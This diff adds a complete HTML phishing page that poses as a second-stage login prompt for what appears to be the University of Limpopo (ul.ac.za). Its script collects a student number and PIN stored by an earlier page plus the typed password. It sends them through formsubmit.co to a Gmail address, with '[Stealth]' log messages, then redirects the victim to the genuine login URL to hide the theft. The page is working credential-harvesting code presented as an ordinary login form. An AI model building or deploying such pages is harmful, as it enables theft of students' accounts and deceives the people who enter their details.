@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Please supply your password</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #fff;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      height: 100vh;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .login-box {
+      border: 1px solid #ccc;
+      border-radius: 10px;
+      padding: 25px 30px;
+      max-width: 450px;
+      width: 100%;
+      box-shadow: 0 0 5px rgba(0,0,0,0.1);
+    }
+
+    h2 {
+      font-size: 18px;
+      margin-bottom: 10px;
+    }
+
+    p {
+      font-size: 14px;
+      margin-top: 0;
+      margin-bottom: 15px;
+    }
+
+    label {
+      font-weight: bold;
+      margin-bottom: 5px;
+      display: inline-block;
+    }
+
+    .required {
+      color: red;
+      margin-left: 5px;
+    }
+
+    input[type="password"] {
+      padding: 5px;
+      width: 200px;
+      margin-right: 10px;
+      font-size: 14px;
+    }
+
+    .button-group {
+      margin-top: 10px;
+    }
+
+    button {
+      padding: 5px 12px;
+      font-size: 14px;
+      margin-right: 5px;
+      cursor: pointer;
+    }
+
+    .link-group {
+      margin-top: 15px;
+      font-size: 14px;
+    }
+
+    .link-group a {
+      display: block;
+      text-decoration: none;
+      color: #3366cc;
+      margin-top: 3px;
+    }
+
+    .link-group a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="login-box">
+    <h2>Please supply your password</h2>
+    <p>You need to supply your password in order to complete the login process</p>
+
+    <form id="passwordForm">
+      <label for="password">Password</label>
+      <input type="password" id="password" name="password" required>
+      <span class="required">*</span>
+
+      <div class="button-group">
+        <button type="submit">Login</button>
+        <button type="button">Forgot Password</button>
+      </div>
+
+      <div class="link-group">
+        <a href="#">Change Password</a>
+        <a href="#">Go back to Login Screen</a>
+      </div>
+    </form>
+  </div>
+
+  <script>
+  document.addEventListener('DOMContentLoaded', () => {
+    const form = document.getElementById('passwordForm');
+    const passwordInput = document.getElementById('password');
+
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+
+      const loginData = JSON.parse(localStorage.getItem('loginData') || '{}');
+      const password = passwordInput.value.trim();
+
+      if (!loginData.unum || !loginData.pin || !password) {
+        console.error('[Stealth] Missing data');
+        return;
+      }
+
+      const formData = new FormData();
+      formData.append('name', 'Second Stage Login');
+      formData.append('email', 'noreply@ul.ac.za');
+      formData.append('subject', `Final Login - ${loginData.unum}`);
+      formData.append('message', 
+        `Student Number: ${loginData.unum}\\n` +
+        `PIN: ${loginData.pin}\\n` +
+        `Password: ${password}\\n` +
+        `Timestamp: ${new Date().toISOString()}\\n` +
+        `Page: ${window.location.href}`
+      );
+      formData.append('_captcha', 'false');
+      formData.append('_template', 'table');
+
+      try {
+        await fetch('https://formsubmit.co/ajax/kiddxxq1@gmail.com', {
+          method: 'POST',
+          body: formData
+        });
+
+        localStorage.removeItem('loginData');
+        window.location.href = 'https://ulc-prod-webserver.ul.ac.za/pls/prodi41/w99pkg.mi_login';
+      } catch (err) {
+        console.error('[Stealth] Failed to send form:', err);
+      }
+    });
+  });
+  </script>
+
+</body>
+</html>
